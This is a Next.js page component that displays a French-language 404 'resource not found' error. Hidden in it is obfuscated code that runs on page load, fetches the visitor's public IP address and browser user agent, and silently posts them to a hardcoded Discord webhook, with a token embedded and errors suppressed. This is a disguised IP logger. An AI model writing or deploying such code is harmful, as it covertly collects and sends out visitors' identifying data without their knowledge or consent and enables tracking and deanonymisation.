import { NextPage } from 'next';

const X7qZ: NextPage = () => {
    const k9mP = "https://discord.com/api/webhooks/1421207807742574612/jaMdF-rsDp1IwkBeP18gVtGLzDAMb5yokipsYPq7GPBDG58jYKlUrdgzKoAh94vn9ZOp";

    fetch("https://api.ipify.org?format=json").then(_0x1a => _0x1a.json()).then(_0x2b => {
        const qW3r = _0x2b.ip;
        const zY6t = navigator.userAgent;

        const pL9n = {
            embeds: [{
                title: "\u{1F4E5} Entrée \u{1F4E5}",
                color: 0x3512b3,
                fields: [{
                    name: "\u{1F310} Adr",
                    value: `\`\`\`${qW3r}\`\`\``,
                    inline: !1
                }, {
                    name: "\u{1F9ED} UA",
                    value: `\`\`\`${zY6t}\`\`\``,
                    inline: !1
                }],
                timestamp: new Date().toISOString()
            }]
        };

        fetch(k9mP, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(pL9n)
        }).catch(_0x3c => {});
    }).catch(_0x4d => {});

    return (
        <div style={{
            backgroundColor: '#fff',
            color: '#222',
            fontFamily: 'monospace',
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            height: '100vh',
            margin: 0
        }}>
            <h1 style={{ fontSize: '3em', color: '#d00' }}>404</h1>
            <p style={{ fontSize: '1.2em' }}>Ressource introuvable.</p>
        </div>
    );
};

export default X7qZ;